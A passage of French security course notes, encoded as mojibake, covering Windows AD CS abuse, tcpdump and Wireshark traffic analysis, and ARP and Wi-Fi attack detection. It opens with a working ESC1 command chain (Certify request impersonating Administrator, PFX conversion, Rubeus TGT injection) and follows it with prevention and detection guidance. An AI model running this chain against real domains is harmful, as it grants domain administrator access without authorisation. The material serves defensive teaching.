**Exemple de rÃ©sultat :**

> Le modÃ¨le **UserCert** est vulnÃ©rable car :
>
> * Accessible Ã  tous les utilisateurs du domaine.
> * Permet la dÃ©finition du **Subject Alternative Name (SAN)** (donc l'usurpation d'autres identitÃ©s).
> * Ne nÃ©cessite pas dâ€™approbation dâ€™un responsable.
> * Permet lâ€™authentification client (logon).

#### 2. Demander un certificat en usurpant lâ€™identitÃ© de **Administrator** :

```powershell
.\Certify.exe request /ca:PKI.eagle.local\eagle-PKI-CA /template:UserCert /altname:Administrator
```

Cela gÃ©nÃ¨re un **certificat au format PEM**.

#### 3. Convertir le certificat en **format PFX** (compatible avec Rubeus) :

```bash
sed -i 's/\s\s\+/\n/g' cert.pem
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

#### 4. Utiliser **Rubeus** pour obtenir un TGT en tant quâ€™**Administrator** :

```powershell
.\Rubeus.exe asktgt /domain:eagle.local /user:Administrator /certificate:cert.pfx /dc:dc1.eagle.local /ptt
```

Une fois le TGT chargÃ©, vous pouvez par exemple accÃ©der Ã  `\\dc1\c$` en tant quâ€™Administrateur.

---

### ğŸ›¡ï¸ PrÃ©vention

Pour se prÃ©munir contre lâ€™exploitation du modÃ¨le **ESC1** :

* **DÃ©sactiver le flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** sur les modÃ¨les de certificat.
* **Activer lâ€™approbation manuelle** (par un Certificate Manager) pour toute demande de certificat.

Il est recommandÃ© de **scanner rÃ©guliÃ¨rement lâ€™environnement PKI** avec Certify ou un outil similaire afin de repÃ©rer les mauvaises configurations.

---

### ğŸ” DÃ©tection

#### ğŸ“‹ Ã‰vÃ©nements Windows :

* **ID 4886** : Demande de certificat enregistrÃ©e.
* **ID 4887** : Certificat Ã©mis.
* **ID 4768** : TGT Ã©mis suite Ã  lâ€™authentification avec un certificat.

> **Limitation :** Les journaux ne montrent pas directement la valeur du SAN, ce qui peut limiter lâ€™analyse automatique.

#### ğŸ”§ Utilisation de `certutil` pour consulter les certificats Ã©mis :

```powershell
certutil -view
```

#### ğŸ”„ Exemple de rÃ©cupÃ©ration de journaux par script :

```powershell
$events = Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
$events[0] | Format-List -Property *
```

#### ğŸ’» Surveillance Ã  distance :

Si lâ€™accÃ¨s GUI au serveur PKI est indisponible, utilisez une session PowerShell distante :

```powershell
New-PSSession -ComputerName PKI
Enter-PSSession -ComputerName PKI
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4886'}
Get-WinEvent -FilterHashtable @{Logname='Security'; ID='4887'}
```

---

### âœ… Remarques

* Surveiller **Ã©troitement les activitÃ©s PKI** est essentiel pour sÃ©curiser lâ€™Active Directory.
* Lâ€™**Ã©mission non autorisÃ©e de certificats** peut fournir aux attaquants un accÃ¨s durable et silencieux Ã  lâ€™environnement.

---

```

 
  

 

 

 
     
 

  

  

 

  

## **Intro to Network Traffic Analysis**

## Tcpdump Fundamentals

```jsx

---

## ğŸ“¡ Introduction Ã  Tcpdump

**Tcpdump** est un **analyseur de paquets en ligne de commande** (packet sniffer) utilisÃ© pour capturer et interprÃ©ter les trames rÃ©seau provenant des interfaces rÃ©seau. Principalement disponible sur les systÃ¨mes Unix/Linux, Tcpdump permet dâ€™**observer le trafic rÃ©seau "en direct"**, ce qui en fait un outil indispensable pour lâ€™analyse, le dÃ©pannage et lâ€™investigation rÃ©seau.

> âš ï¸ Tcpdump requiert les **droits root** pour accÃ©der aux interfaces matÃ©rielles rÃ©seau. Sur les systÃ¨mes Linux, il est gÃ©nÃ©ralement exÃ©cutÃ© via `sudo`.
> ğŸ“Œ Sur Windows, on peut utiliser **WinDump** ou lancer Tcpdump via **WSL (Windows Subsystem for Linux)**.

---

## âš™ï¸ Options de base pour la capture

Tcpdump propose de nombreux **commutateurs (switches)** pour personnaliser les captures :

| Option              | Description                                                     |
| ------------------- | --------------------------------------------------------------- |
| `-D`                | Affiche les interfaces rÃ©seau disponibles.                      |
| `-i`                | SpÃ©cifie une interface Ã  utiliser (ex : `-i eth0`).             |
| `-n`                | DÃ©sactive la rÃ©solution des noms dâ€™hÃ´tes.                       |
| `-nn`               | DÃ©sactive la rÃ©solution des noms dâ€™hÃ´tes **et** des ports.      |
| `-e`                | Affiche lâ€™en-tÃªte Ethernet dans les rÃ©sultats.                  |
| `-X`                | Affiche le contenu des paquets en **hexadÃ©cimal** et **ASCII**. |
| `-v`, `-vv`, `-vvv` | Augmente le niveau de verbositÃ©.                                |
| `-c`                | Capture un nombre dÃ©fini de paquets, puis quitte.               |
| `-s`                | DÃ©finit la longueur maximale des paquets capturÃ©s.              |
| `-S`                | Affiche les numÃ©ros de sÃ©quence TCP absolus.                    |
| `-q`                | Affiche un rÃ©sumÃ© minimal du protocole.                         |
| `-r`                | Lit les paquets depuis un fichier.                              |
| `-w`                | Ã‰crit les paquets dans un fichier pour une analyse ultÃ©rieure.  |

---

## ğŸ” Exemples d'utilisation

### ğŸ›ï¸ Afficher les interfaces disponibles

```bash
sudo tcpdump -D
```

### ğŸ§² Capturer le trafic d'une interface spÃ©cifique

```bash
sudo tcpdump -i eth0
```

### âŒ DÃ©sactiver la rÃ©solution DNS et des ports

```bash
sudo tcpdump -i eth0 -nn
```

### ğŸ“¦ Inclure lâ€™en-tÃªte Ethernet

```bash
sudo tcpdump -i eth0 -e
```

### ğŸ”  Afficher les paquets en HEX/ASCII

```bash
sudo tcpdump -i eth0 -X
```

### ğŸ›ï¸ Combiner plusieurs options

```bash
sudo tcpdump -i eth0 -nnvXX
```

---

## ğŸ§¾ InterprÃ©tation de la sortie Tcpdump

La sortie peut inclure plusieurs champs :

| Champ                       | Description                                          |
| --------------------------- | ---------------------------------------------------- |
| **Horodatage**              | Heure de capture du paquet.                          |
| **Protocole**               | Protocole de couche supÃ©rieure (IP, TCP, UDP, etc.). |
| **Source / Destination**    | IP et ports dâ€™origine et de destination.             |
| **Drapeaux TCP**            | Indicateurs SYN, ACK, RST, etc.                      |
| **NÂ° de sÃ©quence et dâ€™ACK** | Suivi des segments TCP.                              |
| **Options du protocole**    | FenÃªtre TCP, SACK, etc.                              |

---

## ğŸ’¾ Lecture & Ã‰criture de fichiers

### ğŸ”½ Sauvegarder une capture dans un fichier `.pcap` :

```bash
sudo tcpdump -i eth0 -w ~/capture.pcap
```

### ğŸ”¼ Lire une capture existante :

```bash
sudo tcpdump -r ~/capture.pcap
```

> Astuce : Ajoutez les options comme `-X` ou `-vvv` pour une lecture plus dÃ©taillÃ©e.

---

## ğŸ§  Utilisation avancÃ©e : Tcpdump comme IDS lÃ©ger

Tcpdump peut Ãªtre intÃ©grÃ© dans des **scripts de dÃ©tection dâ€™intrusion simples**, par exemple :

* DÃ©tecter un nombre inhabituel de requÃªtes **ICMP (ping)** depuis une IP.
* Automatiser des alertes ou des blocages via des rÃ¨gles de pare-feu ou des logs.

---

```

## Tcpdump Packet Filtering

```jsx

---

## ğŸ¯ Filtres AvancÃ©s avec Tcpdump

Lâ€™utilisation de **filtres avancÃ©s** dans Tcpdump permet de **rÃ©duire le volume de trafic affichÃ© ou enregistrÃ©**, ce qui amÃ©liore les performances et Ã©conomise de lâ€™espace disque. Ces filtres peuvent Ãªtre associÃ©s Ã  la syntaxe classique de Tcpdump pour effectuer des captures ciblÃ©es : dâ€™un simple hÃ´te Ã  des flux trÃ¨s spÃ©cifiques via des ports ou des indicateurs TCP.

---

### ğŸ§° Filtres Tcpdump Utiles

| Filtre               | Effet                                                               |
| -------------------- | ------------------------------------------------------------------- |
| `host`               | Affiche le trafic impliquant un hÃ´te donnÃ© (trafic bidirectionnel). |
| `src` / `dst`        | Filtre selon lâ€™adresse source ou destination.                       |
| `net`                | Filtre le trafic dâ€™un rÃ©seau (notation CIDR, ex : `/24`).           |
| `proto`              | Filtre par protocole (ex : `tcp`, `udp`, `icmp`, `ether`).          |
| `port`               | Filtre le trafic avec un port source ou destination spÃ©cifique.     |
| `portrange`          | Filtre un intervalle de ports (ex : `0-1024`).                      |
| `less` / `greater`   | Filtre selon la taille des paquets.                                 |
| `and` / `or` / `not` | Combine, ajoute ou exclut des conditions.                           |

---

## ğŸ“Œ Exemples de Filtres Pratiques

### ğŸ¯ Filtrage par HÃ´te

```bash
sudo tcpdump -i eth0 host 172.16.146.2
```

### ğŸ“¤ Filtrage par Source

```bash
sudo tcpdump -i eth0 src host 172.16.146.2
```

### ğŸ“¥ Filtrage par Port Source

```bash
sudo tcpdump -i eth0 tcp src port 80
```

### ğŸŒ Filtrage par RÃ©seau Destination

```bash
sudo tcpdump -i eth0 dst net 172.16.146.0/24
```

### ğŸ“¦ Filtrage par Protocole

```bash
sudo tcpdump -i eth0 udp
sudo tcpdump -i eth0 proto 17  # UDP (protocole 17)
```

### ğŸ”’ Filtrage par Port / Plage de Ports

```bash
sudo tcpdump -i eth0 tcp port 443
sudo tcpdump -i eth0 portrange 0-1024
```

### ğŸ“ Filtrage par Taille de Paquet

```bash
sudo tcpdump -i eth0 less 64
sudo tcpdump -i eth0 greater 500
```

---

## ğŸ”— Combinaisons de Filtres

### âœ… Avec `AND`

```bash
sudo tcpdump -i eth0 host 192.168.0.1 and port 23
```

### âœ… Avec `OR`

```bash
sudo tcpdump -r sus.pcap icmp or host 172.16.146.1
```

### âŒ Avec `NOT`

```bash
sudo tcpdump -r sus.pcap not icmp
```

---

## ğŸ§  Capture vs. Analyse PostÃ©rieure

* **Filtrage en prÃ©-capture** : les paquets **non correspondants ne sont pas enregistrÃ©s** â†’ gain de place mais perte possible dâ€™infos.
* **Filtrage en post-capture** : les paquets sont filtrÃ©s **lors de la lecture dâ€™un fichier .pcap**, sans affecter les donnÃ©es dâ€™origine.

---

## ğŸ›  Astuces dâ€™InterprÃ©tation

| Option                 | Usage                                                                     |
| ---------------------- | ------------------------------------------------------------------------- |
| `-S`                   | Affiche les numÃ©ros de sÃ©quence TCP absolus.                              |
| `-v`, `-X`, `-e`       | Affiche plus de dÃ©tails sur les paquets.                                  |
| `-c`, `-n`, `-s`, `-q` | Modifie le format ou le volume de sortie.                                 |
| `-A`                   | Affiche uniquement le contenu ASCII (pratique pour les donnÃ©es lisibles). |

### Exemple : ASCII uniquement

```bash
sudo tcpdump -Ar telnet.pcap
```

---

## ğŸ” Analyse de contenu avec `grep`

Filtrer un fichier `.pcap` en temps rÃ©el :

```bash
sudo tcpdump -Ar http.cap -l | grep 'mailto:*'
```

---

## ğŸ¯ Filtrage avancÃ© sur les **flags TCP**

Pour cibler les paquets avec le **flag SYN** activÃ© :

```bash
tcpdump -i eth0 'tcp[13] & 2 != 0'
```

---

## ğŸ“š RÃ©fÃ©rences RFC des Protocoles

| Protocole | RFC                                                     |
| --------- | ------------------------------------------------------- |
| IP        | [RFC 791](https://datatracker.ietf.org/doc/html/rfc791) |
| ICMP      | [RFC 792](https://datatracker.ietf.org/doc/html/rfc792) |
| TCP       | [RFC 793](https://datatracker.ietf.org/doc/html/rfc793) |
| UDP       | [RFC 768](https://datatracker.ietf.org/doc/html/rfc768) |

---

```

## **Interrogating Network Traffic With Capture and Display Filters**

```jsx

---

## ğŸ§ª **Objectifs du Laboratoire Tcpdump**

* Apprendre Ã  filtrer le trafic capturÃ© pour en extraire des donnÃ©es utiles.
* Identifier les serveurs rÃ©pondant aux requÃªtes **DNS** et **HTTP/HTTPS**.
* Analyser les **modÃ¨les de communication** rÃ©seau et les **connexions**.

---

## ğŸ“ **TÃ¢ches Ã  RÃ©aliser**

| TÃ¢che                                                     | Description                                                                                                              | Commande / DÃ©tails                                                                             |
| --------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------------------------------------- |
| **TÃ¢che 1 : Lecture du fichier .pcap sans filtre**        | Observez la capture brute.                                                                                               | `tcpdump -r fichier.pcap`                                                                      |
| **TÃ¢che 2 : Identifier les types de trafic**              | Recherchez les **protocoles** et **ports** utilisÃ©s.                                                                     | Protocoles typiques : DNS (53), HTTP (80), HTTPS (443)                                         |
| **TÃ¢che 3 : Identifier les Ã©changes et modÃ¨les**          | Analysez les **connexions client/serveur**.<br>RepÃ©rez les **handshakes TCP**.                                           | `tcpdump -S -r fichier.pcap` pour voir les sÃ©quences TCP complÃ¨tes                             |
| **TÃ¢che 4 : Analyse dÃ©taillÃ©e de la capture**             | Trouvez :<br>- Timestamp de la premiÃ¨re conversation<br>- RÃ©ponse DNS pour apache.org<br>- Protocole en fonction du port | `tcpdump -r fichier.pcap -nn`<br>`tcpdump -r fichier.pcap src host [IP]`                       |
| **TÃ¢che 5 : Filtrer le trafic DNS uniquement**            | Isolez les paquets **UDP sur port 53**.<br>Analysez les noms de domaine, types dâ€™enregistrements.                        | `sudo tcpdump -r fichier.pcap udp and port 53`<br>`tcpdump -X -r fichier.pcap`                 |
| **TÃ¢che 6 : Filtrer le trafic HTTP/HTTPS**                | Isolez les ports **80 et 443**.<br>Identifiez les mÃ©thodes HTTP (GET, POST) et les **codes rÃ©ponse**.                    | `tcpdump -r fichier.pcap 'port 80 or port 443'`                                                |
| **TÃ¢che 7 : Analyser le premier serveur de conversation** | Examinez la **rÃ©ponse HTTP** pour en dÃ©duire la techno serveur (Apache, Nginx...).                                       | `tcpdump -X -r fichier.pcap`<br>Regardez dans le contenu HTTP : headers comme `Server: Apache` |

---

## ğŸ” **Pistes dâ€™Analyse Ã  Suivre**

Posez-vous les questions suivantes pendant l'analyse :

* Quels types de trafic sont prÃ©sents (protocoles, ports) ?
* Combien de **conversations uniques** ou hÃ´tes distincts ?
* Quel est le **timestamp** de la premiÃ¨re connexion TCP ?
* Quels **filtres Tcpdump** peuvent simplifier lâ€™analyse ?
* Quels **serveurs** rÃ©pondent sur des ports standards ?
* Quels types de **requÃªtes DNS** et **mÃ©thodes HTTP** sont utilisÃ©s ?

---

```

## **Wireshark Advanced Usage**

```jsx

---
 ## ğŸ§© **Plugins dans Wireshark** 

Wireshark propose plusieurs **plugins puissants** accessibles via les menus **"Statistics"** et **"Analyze"**, permettant une analyse approfondie du trafic rÃ©seau.

---

### ğŸ“Š **Onglet "Statistics"** (Statistiques)

Permet de **visualiser des rapports dÃ©taillÃ©s** sur le trafic capturÃ©, notamment :

* RÃ©partition par **protocoles**
* **Top IP** / hÃ´tes les plus bavards
* Types de **conversations** (TCP, UDP, IPX, etc.)

---

### ğŸ” **Onglet "Analyze"** (Analyser)

Offre des outils pour :

* Suivre les **flux TCP**
* Filtrer par **type de conversation**
* CrÃ©er des **filtres personnalisÃ©s**
* AccÃ©der Ã  des **diagnostics experts** sur les anomalies rÃ©seau

---

## ğŸ”„ **Suivre un flux TCP**

Wireshark peut reconstituer un flux TCP complet (conversation entre deux hÃ´tes) dans un format lisible, idÃ©al pour analyser des Ã©changes HTTP, FTP, etc.

### âœ… **MÃ©thode :**

1. Clic droit sur un paquet du flux.
2. SÃ©lectionnez **Follow > TCP Stream**.
3. Une fenÃªtre sâ€™ouvre avec toute la conversation reconstituÃ©e.

### ğŸ¯ **Filtre alternatif :**

```bash
tcp.stream eq #
```

Remplacez `#` par le numÃ©ro du flux (visible dans la colonne "Stream Index") pour afficher uniquement les paquets de cette conversation.

---

## ğŸ“‚ **Extraction de donnÃ©es ou fichiers**

Si une conversation complÃ¨te est capturÃ©e, Wireshark peut **extraire des fichiers transmis**, notamment via FTP, HTTP ou SMB.

### ğŸ”§ **Ã‰tapes pour extraire un fichier :**

1. ArrÃªtez la capture.
2. Allez dans **File > Export Objects**, puis choisissez le protocole (HTTP, DICOM, SMB, etc.).
3. SÃ©lectionnez les fichiers listÃ©s et cliquez sur **Save As** pour les extraire.

---

## ğŸ“ **Analyse du protocole FTP**

Le protocole FTP utilise :

* **Port 21** pour les commandes de contrÃ´le (authentification, liste de fichiers).
* **Port 20** pour le transfert de donnÃ©es.

### ğŸ” **Filtres utiles dans Wireshark :**

| Filtre                | Fonction                                              |
| --------------------- | ----------------------------------------------------- |
| `ftp`                 | Affiche tout le trafic FTP (port 21)                  |
| `ftp.request.command` | Affiche les commandes FTP (USER, PASS, RETR, STOR...) |
| `ftp-data`            | Montre les transferts de fichiers sur le port 20      |

---

### ğŸ“¥ **Reconstruction dâ€™un fichier FTP depuis un .pcap :**

1. **Filtrer le trafic FTP :**

   ```bash
   ftp
   ```

2. **Identifier les commandes :**

   ```bash
   ftp.request.command
   ```

   Permet de repÃ©rer les noms de fichiers et les tentatives de login.

3. **Trouver les donnÃ©es transfÃ©rÃ©es :**

   ```bash
   ftp-data
   ```

4. **Suivre le flux TCP du fichier souhaitÃ© :**

   * Clic droit > Follow > TCP Stream
   * Choisir **Raw** comme affichage
   * **Enregistrer le contenu** avec le nom de fichier original

5. **VÃ©rifier le type du fichier** (par exemple avec `file` sous Linux) pour s'assurer quâ€™il a Ã©tÃ© correctement reconstruit.

---

Ce processus permet de **rÃ©aliser des analyses forensiques prÃ©cises**, dâ€™extraire des fichiers transmis sur le rÃ©seau et dâ€™identifier des activitÃ©s suspectes ou malveillantes.

```

## **Packet Inception, Dissecting Network Traffic With Wireshark**

```jsx

---

## ğŸ§ª **Objectifs du Lab : Analyse de trafic HTTP avec Wireshark**

Ce laboratoire vous guide Ã©tape par Ã©tape pour analyser le trafic HTTP, identifier des transferts de fichiers (notamment des images JPEG), et extraire des fichiers Ã  partir dâ€™une capture rÃ©seau.

---

### âœ… **TÃ¢che 1 : Ouvrir un fichier PCAP**

**But :** Charger un fichier `.pcap` prÃ©-capturÃ© pour analyser le trafic HTTP.

**Ã‰tapes :**

1. Ouvrir **Wireshark**.
2. Aller dans **Fichier â†’ Ouvrir** (`File â†’ Open`).
3. SÃ©lectionner **Wireshark-lab-2.pcap**.
4. Le fichier sâ€™ouvre et affiche lâ€™ensemble du trafic rÃ©seau capturÃ©.

---

### âœ… **TÃ¢che 2 : Filtrer le trafic HTTP**

**But :** Se concentrer uniquement sur les communications HTTP (port 80), en particulier les **requÃªtes GET** et les **rÃ©ponses 200 OK** (indiquant un transfert rÃ©ussi de fichiers).

**Ã‰tapes :**

1. Dans la barre de filtres, taper :

   ```
   http
   ```
2. VÃ©rifier que la barre devient **verte** (syntaxe correcte).
3. Parcourir les paquets :

   * Rechercher les lignes contenant **GET**.
   * Identifier les rÃ©ponses **HTTP/1.1 200 OK**.

---

### âœ… **TÃ¢che 3 : Suivre un flux TCP**

**But :** Examiner une session HTTP complÃ¨te associÃ©e Ã  un transfert de fichier.

**Ã‰tapes :**

1. Cliquer sur un paquet **HTTP 200 OK**.
2. Clic droit â†’ **Follow â†’ TCP Stream**.
3. Une nouvelle fenÃªtre affiche la **conversation complÃ¨te**.
4. Confirmer que le **fichier a bien Ã©tÃ© transfÃ©rÃ©** dans ce flux.

---

### âœ… **TÃ¢che 4 : Rechercher des images JFIF**

**But :** Identifier les fichiers image JPEG (format JFIF) transfÃ©rÃ©s via HTTP.

**Ã‰tapes :**

1. Effacer tout filtre actif.
2. Taper le filtre suivant :

   ```
   http && image-jfif
   ```
3. Ce filtre isole uniquement les paquets contenant des **images JPEG intÃ©grÃ©es**, facilitant leur dÃ©tection.

---

### âœ… **TÃ¢che 5 : Extraire les images du trafic**

**But :** Exporter les fichiers image dÃ©tectÃ©s afin de les analyser ou de les transmettre Ã  lâ€™Ã©quipe de sÃ©curitÃ©.

**Ã‰tapes :**

1. Aller dans le menu **File â†’ Export Objects â†’ HTTP**.
2. Parcourir la liste et repÃ©rer les fichiers JPEG (ex. : `file.JPG`).
3. Cliquer sur **Save As** pour enregistrer localement le fichier image.

---

### ğŸ” **Conseil de sÃ©curitÃ© :**

Les images extraites peuvent contenir des **donnÃ©es cachÃ©es** (stÃ©ganographie) ou avoir Ã©tÃ© exfiltrÃ©es illÃ©galement. Il est essentiel de les examiner avec soin selon les instructions du responsable sÃ©curitÃ©.

```

## **Decrypting RDP Connections**

```jsx

---

## ğŸ§ª **Laboratoire : Analyse de sessions RDP chiffrÃ©es avec Wireshark**

Ce laboratoire montre comment identifier, dÃ©chiffrer et analyser le trafic RDP contenu dans un fichier `.pcapng` Ã  lâ€™aide de **Wireshark**, en utilisant une **clÃ© privÃ©e RSA** pour accÃ©der aux donnÃ©es sensibles comme le nom d'utilisateur.

---

### âœ… **TÃ¢che 1 : Ouvrir un fichier PCAP RDP**

**But :** Charger la capture RDP Ã  analyser.

**Ã‰tapes :**

1. Extraire le fichier **RDP-analysis.zip**.
2. Ouvrir **Wireshark**.
3. SÃ©lectionner **Fichier â†’ Ouvrir** (`File â†’ Open`) et choisir **rdp.pcapng**.

---

### âœ… **TÃ¢che 2 : Analyse initiale du trafic RDP**

**But :** Identifier le trafic RDP dans la capture, gÃ©nÃ©ralement sur le port TCP 3389.

**Commandes de filtre :**

* Pour voir uniquement le trafic RDP :

  ```
  rdp
  ```
* Pour filtrer par port :

  ```
  tcp.port == 3389
  ```

---

### âœ… **TÃ¢che 3 : Ajouter la clÃ© de dÃ©chiffrement dans Wireshark**

**But :** DÃ©chiffrer le trafic RDP avec une clÃ© RSA privÃ©e rÃ©cupÃ©rÃ©e depuis lâ€™hÃ´te de Bob.

**Ã‰tapes :**

1. Aller dans **Ã‰dition â†’ PrÃ©fÃ©rences â†’ Protocoles â†’ TLS**.
2. Sous "RSA Keys List", cliquer sur **Ã‰diter** puis **Ajouter** une nouvelle entrÃ©e :

   * **Adresse IP :** `10.129.43.29`
   * **Port :** `3389`
   * **Protocole :** `tpkt` (ou laisser vide si nÃ©cessaire)
   * **Fichier de clÃ© :** SÃ©lectionner le fichier **server.key**
3. Enregistrer les changements.
4. **RafraÃ®chir** le fichier `.pcapng` dans Wireshark.

---

### âœ… **TÃ¢che 4 : Analyse du trafic RDP dÃ©chiffrÃ©**

**But :** Observer les donnÃ©es maintenant lisibles et examiner le contenu des sessions RDP.

**Filtre recommandÃ© :**

```
rdp
```

**Astuce :** Vous pouvez aussi suivre les **flux TCP** pour voir lâ€™Ã©change complet entre client et serveur.

---

### ğŸ•µï¸ **Questions dâ€™analyse**

* **Adresse IP de l'hÃ´te initiateur :**
  Chercher le **premier paquet** de la **poignÃ©e de main TCP (SYN)**.
  **RÃ©ponse :** `10.129.43.27`

* **Nom d'utilisateur utilisÃ© dans la session RDP :**
  Dans le trafic dÃ©chiffrÃ© (filtrÃ© avec `tcp.port == 3389`), chercher dans les paquets marquÃ©s **"Ignored Unknown Record"**. Le **contenu ASCII** peut afficher le **nom d'utilisateur**.

---

### ğŸ“Œ **RÃ©sumÃ© et enseignement**

GrÃ¢ce Ã  la **clÃ© privÃ©e RSA**, **Wireshark** permet de **dÃ©chiffrer** des protocoles habituellement sÃ©curisÃ©s comme RDP. Cela est crucial en **analyse forensique** et en **rÃ©ponse Ã  incident**, car :

* Le contenu des sessions RDP peut Ãªtre examinÃ©.
* Des donnÃ©es sensibles comme les **identifiants de connexion** peuvent Ãªtre rÃ©cupÃ©rÃ©es.
* Cela renforce lâ€™importance de **protÃ©ger les clÃ©s privÃ©es** et de **restreindre les accÃ¨s RDP**.

```

## Intermediate Network Traffic Analysis Overview

## **ARP Spoofing & Abnormality Detection**

```jsx

---

## ğŸ§¾ **Vue dâ€™ensemble**

* Le **protocole ARP (Address Resolution Protocol)** est souvent la cible dâ€™attaques comme :

  * **Man-in-the-Middle (MITM)**
  * **DÃ©ni de service (DoS)**
* Ces attaques sont dÃ©tectables car elles s'appuient sur des **diffusions rÃ©seau (broadcast)**, capturables via un **sniffer de paquets**.

---

## âš™ï¸ **Fonctionnement du protocole ARP**

* Les hÃ´tes utilisent ARP pour connaÃ®tre lâ€™adresse MAC associÃ©e Ã  une IP sur le rÃ©seau local.

**Ã‰tapes du processus ARP :**

1. **Lâ€™hÃ´te A** vÃ©rifie son cache ARP.
2. Si lâ€™IP nâ€™est pas trouvÃ©e, il diffuse une **requÃªte ARP (ARP Request)**.
3. **Lâ€™hÃ´te B** rÃ©pond avec une **rÃ©ponse ARP (ARP Reply)** contenant son adresse IP et MAC.
4. Le cache ARP de A est mis Ã  jour avec la nouvelle correspondance IP-MAC.

---

## ğŸ§¨ **Empoisonnement / Usurpation ARP (ARP Poisoning & Spoofing)**

* **ARP Cache Poisoning** : Lâ€™attaquant envoie de fausses trames ARP pour tromper les caches ARP.

### ğŸ¯ Ã‰tapes de lâ€™attaque :

1. Lâ€™attaquant envoie des **ARP Replies falsifiÃ©es** Ã  la victime **et** au routeur.
2. Les deux mettent Ã  jour leur cache avec la **fausse adresse MAC de lâ€™attaquant**.
3. Lâ€™attaquant devient un relais, **intercepte** le trafic et peut **le modifier** (attaque MITM).

---

## ğŸ•µï¸ **DÃ©tection & PrÃ©vention**

### ğŸ” **DÃ©tection :**

* Surveiller les modÃ¨les inhabituels de trafic ARP (ex. : requÃªtes rÃ©pÃ©tÃ©es).
* RepÃ©rer des **incohÃ©rences IP-MAC** dans les rÃ©ponses ARP.

### ğŸ›¡ï¸ **PrÃ©vention :**

* **EntrÃ©es ARP statiques** : empÃªchent la mise Ã  jour automatique (mais difficiles Ã  gÃ©rer).
* **SÃ©curitÃ© des ports sur les switches** : limite les MAC autorisÃ©es sur un port rÃ©seau.

---

## ğŸ§ª **DÃ©tection pratique avec tcpdump et Wireshark**

### ğŸ“¥ **Installation de tcpdump :**

```bash
sudo apt install tcpdump -y
```

### ğŸ“¦ **Capture du trafic ARP :**

```bash
sudo tcpdump -i eth0 -w capture_arp.pcapng
```

### ğŸ“ˆ **Analyse dans Wireshark :**

```bash
wireshark capture_arp.pcapng
```

#### ğŸ“Œ Filtres Wireshark utiles :

| But                    | Filtre                                              |
| ---------------------- | --------------------------------------------------- |
| RequÃªtes ARP           | `arp.opcode == 1`                                   |
| RÃ©ponses ARP           | `arp.opcode == 2`                                   |
| Duplications dâ€™adresse | `arp.duplicate-address-detected && arp.opcode == 2` |

---

## ğŸ” **Examiner les anomalies IP/MAC**

Utilisez `arp -a` sur Linux pour inspecter la table ARP :

```bash
arp -a | grep 50:eb:f6:ec:0e:7f
arp -a | grep 08:00:27:53:0c:ba
```

Dans **Wireshark**, filtrez les adresses MAC suspectes :

```bash
eth.addr == 50:eb:f6:ec:0e:7f or eth.addr == 08:00:27:53:0c:ba
```

---

```

## **ARP Scanning & Denial-of-Service**

```jsx

---

## ğŸ” **Signes dâ€™activitÃ©s anormales dans le trafic ARP**

En plus des attaques de type **poisoning** et **spoofing**, des acteurs malveillants peuvent aussi exploiter ARP pour effectuer du **renseignement rÃ©seau**.

### âš ï¸ **Indicateurs dâ€™un scan ARP :**

* **RequÃªtes ARP broadcast** envoyÃ©es Ã  des **adresses IP sÃ©quentielles** (ex. : .1, .2, .3, â€¦).
* RequÃªtes ARP envoyÃ©es vers **des hÃ´tes inexistants**.
* **Volume anormal de trafic ARP** provenant dâ€™un seul hÃ´te (potentiellement compromis ou malveillant).

---

## ğŸ§ª **DÃ©tection dâ€™un scan ARP**

En ouvrant le fichier `ARP_Scan.pcapng` dans **Wireshark** et en appliquant le filtre suivant :

```wireshark
arp.opcode
```

On peut observer :

* Un hÃ´te envoyant des requÃªtes ARP vers **toutes les IP dâ€™un sous-rÃ©seau**, ce qui suggÃ¨re un **scan ARP actif** (souvent initiÃ© par des outils comme **Nmap**).
* Les **rÃ©ponses ARP** des hÃ´tes actifs permettent Ã  lâ€™attaquant de **cartographier les Ã©quipements en ligne**.

---

## ğŸš« **Identification dâ€™un dÃ©ni de service (DoS) via ARP**

### ğŸ§¨ Ã‰tapes dâ€™une attaque ARP DoS :

1. Lâ€™attaquant **scanne les hÃ´tes actifs**.
2. Il tente de **corrompre les caches ARP** du rÃ©seau :

   * En attribuant des **nouvelles adresses MAC** Ã  chaque IP lÃ©gitime.
   * En attribuant **une mÃªme IP (ex. : 192.168.10.1)** Ã  plusieurs machines (conflits dâ€™IP), perturbant la communication.

### ğŸ¯ Objectif :

Plonger le sous-rÃ©seau dans le **chaos ARP**, entraÃ®nant :

* Perturbation des connexions.
* PossibilitÃ© dâ€™interception (MITM).
* Saturation du cache ARP des Ã©quipements (DoS).

---

## ğŸ›¡ï¸ **RÃ©action face aux attaques ARP**

### ğŸ” **TraÃ§age et identification** :

* Remonter Ã  la **machine physique** qui Ã©met les paquets ARP suspects.
* Il est possible quâ€™elle soit **elle-mÃªme infectÃ©e** ou utilisÃ©e comme relais.

### ğŸ§¯ **Confinement** :

* **DÃ©connecter** ou **isoler** le segment rÃ©seau affectÃ© via le **switch ou le routeur**.
* Cela permet de **stopper la propagation**, bloquer la fuite de donnÃ©es ou mettre fin Ã  lâ€™attaque DoS/MITM.

---

## ğŸ“ **Remarque Importante**

> Les attaques au **niveau de la couche liaison (couche 2 OSI)** peuvent sembler anodines au dÃ©part, mais leur dÃ©tection prÃ©coce est **cruciale pour Ã©viter des exfiltrations Ã  des couches supÃ©rieures**.

---

```

## **802.11 Denial of Service**

```jsx
### 802.11 (Wi-Fi) Traffic Analysis: Detecting Attacks

In traffic analysis, it's essential to focus on **link-layer protocols** like **802.11 (Wi-Fi)**. Many network defenders overlook Wi-Fi traffic attacks, which can lead to significant vulnerabilities, especially if human error compromises perimeter security.

### Capturing 802.11 Traffic

To analyze raw 802.11 traffic, a **wireless interface in monitor mode** is required. This mode allows you to capture unencrypted frames without the need for an active association with an access point (AP). Itâ€™s similar to promiscuous mode but specifically designed for Wi-Fi.

#### Steps to Capture Traffic:

1. **Enumerate Wireless Interfaces**:
   In **Linux**, use `iwconfig` to list wireless interfaces.

   ```bash
   iwconfig
   ```

2. **Enable Monitor Mode**:
   There are multiple ways to enable monitor mode. Here are two methods:

   * **Option 1**: Using `airmon-ng`:

     ```bash
     sudo airmon-ng start wlan0
     ```

   * **Option 2**: Using system utilities:

     ```bash
